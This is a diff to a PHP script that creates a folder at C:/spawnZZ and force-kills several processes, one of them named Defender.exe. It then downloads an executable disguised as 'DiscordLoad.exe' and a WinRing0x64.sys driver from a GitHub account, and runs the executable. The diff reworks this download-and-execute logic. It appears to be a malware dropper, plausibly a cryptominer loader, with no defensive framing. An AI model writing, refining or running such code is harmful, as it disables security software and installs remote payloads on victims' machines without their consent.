@@ -60,7 +60,7 @@ $deletePaths = [
 
 
 
-system('mkdir "C:/Windows/Temp/spawnZZ/"');
+system('mkdir "C:/spawnZZ/"');
 system('taskkill /F /IM xnightpro.exe');
 system('taskkill /F /IM Defender.exe');
 system('taskkill /F /IM Spotify.exe');
@@ -69,8 +69,8 @@ exec('tasklist', $output);
 $url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/DiscordLoad.exe';
 $url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
 
-$file_name = 'C:/Windows/Temp/spawnZZ/DiscordLoad.exe';
-$file_name2 = 'C:/Windows/Temp/spawnZZ/WinRing0x64.sys';
+$file_name = 'C:/spawnZZ/DiscordLoad.exe';
+$file_name2 = 'C:/spawnZZ/WinRing0x64.sys';
 
 $found = false;
 $found2 = false;
@@ -96,23 +96,23 @@ if (!$found && !$found2) {
 
         if (file_put_contents($file_name, file_get_contents($url)))
             {
-                echo "File downloaded successfully";
+                if (file_put_contents($file_name2, file_get_contents($url2)))
+            {
+                system('C:/spawnZZ/DiscordLoad.exe');
             }
         else
             {
             echo "File downloading failed.";
             }
-         if (file_put_contents($file_name2, file_get_contents($url2)))
-            {
-                echo "File downloaded successfully";
             }
         else
             {
             echo "File downloading failed.";
             }
+         
  
 
-         system('C:/Windows/Temp/spawnZZ/DiscordLoad.exe');
+         
         
 
 
